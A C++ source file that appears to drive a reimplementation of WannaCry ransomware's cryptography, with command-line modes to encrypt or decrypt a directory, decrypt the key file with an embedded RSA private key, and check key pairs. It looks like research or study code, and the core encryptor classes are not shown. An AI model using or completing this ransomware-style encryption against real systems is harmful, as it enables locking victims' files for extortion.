// WannaTry.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <Windows.h>
#include <iostream>
#include <tchar.h>
#include <ShlObj.h>
#include "WanaFile.h"
#include "WanaProc.h"
#include "../Common/hexdump.h"
#include "../Common/ezfile.h"
#include "WanaFile.h"
#include "WanaEncryptor.h"
#include "WanaDecryptor.h"
#include "keys.h"

BOOL DecryptLocalEKY(DWORD nKeyNo)
{
	UCHAR aEkyBuffer[4096];
	UCHAR aDkyBuffer[4096];
	ULONG cbEkyBuffer = 0;
	ULONG cbDkyBuffer = 0;
	ULONG cbResult;
	BOOL bResult = FALSE;
	ReadEkyFile(aEkyBuffer, sizeof(aEkyBuffer), &cbEkyBuffer);
	DEBUG("Decrypt\n");
	PEZRSA pDecRSA = new EZRSA();
	pDecRSA->Import(
		BCRYPT_RSAPRIVATE_BLOB,
		WannaPrivateKey(),
		WannaPrivateKeySize());
	bResult = pDecRSA->Decrypt(
		(PUCHAR)aEkyBuffer,
		cbEkyBuffer,
		aDkyBuffer,
		sizeof(aDkyBuffer),
		&cbDkyBuffer);
	if (!bResult) {
		DEBUG("Decrypt fails\n");
		return FALSE;
	}
	delete pDecRSA;
	WriteDkyFile(aDkyBuffer, cbDkyBuffer, &cbResult);
	return TRUE;
}

int main1()
{
	UCHAR* s = (UCHAR*)"This is a test";
	RESDATA r;
	ReadResFile(&r);
	hexdump((PUCHAR)&r, sizeof(r));
	StartEncryptor();
	DecryptLocalEKY(0);
	PWanaDecryptor pDecryptor = new WanaDecryptor();
	pDecryptor->Decrypt(_T("C:\\TESTDATA"));
	delete pDecryptor;
	return 0;
}

int _tmain(int argc, TCHAR* argv[])
{
	if (argc < 2) {
		_ftprintf(stderr, _T("Usage:\n"));
		_ftprintf(stderr, _T("DecryptEKY\n"));
		_ftprintf(stderr, _T("Encrypt DIR\n"));
		_ftprintf(stderr, _T("Decrypt DIR\n"));
		_ftprintf(stderr, _T("CheckKeyPair PublicFile PrivateFile\n"));
	}
	else if (!_tcsicmp(argv[1], _T("DecryptEKY"))) {
		DecryptLocalEKY(0);
		return 0;
	}
	else if (!_tcsicmp(argv[1], _T("Encrypt")) && argc > 2) {
		PWanaCryptor pCryptor =
			new WanaCryptor(
				WannaPublicKey(),
				WannaPublicKeySize());
		pCryptor->Encrypt(argv[2]);
		delete pCryptor;
		return 0;
	}
	else if (!_tcsicmp(argv[1], _T("Decrypt")) && argc > 2) {
		PWanaDecryptor pDecryptor = new WanaDecryptor();
		pDecryptor->Decrypt(argv[2]);
		delete pDecryptor;
		return 0;
	}
	else if (!_tcsicmp(argv[1], _T("CheckKeyPair"))) {
		TCHAR szPKYFile[MAX_PATH];
		TCHAR szDKYFile[MAX_PATH];
		GetPkyFileName(szPKYFile);
		GetDkyFileName(szDKYFile);
		BOOL bResult = RSAFileMatch(
			szPKYFile,
			szDKYFile);
		_tprintf(_T("return: %d\n"), bResult);
		return 0;
	}
	else {
		_tprintf(_T("unknown: %s\n"), argv[1]);
		return 1;
	}
	return 0;
}

// Run program: Ctrl + F5 or Debug > Start Without Debugging menu
// Debug program: F5 or Debug > Start Debugging menu

// Tips for Getting Started: 
//   1. Use the Solution Explorer window to add/manage files
//   2. Use the Team Explorer window to connect to source control
//   3. Use the Output window to see build output and other messages
//   4. Use the Error List window to view errors
//   5. Go to Project > Add New Item to create new code files, or Project > Add Existing Item to add existing code files to the project
//   6. In the future, to open this project again, go to File > Open > Project and select the .sln file
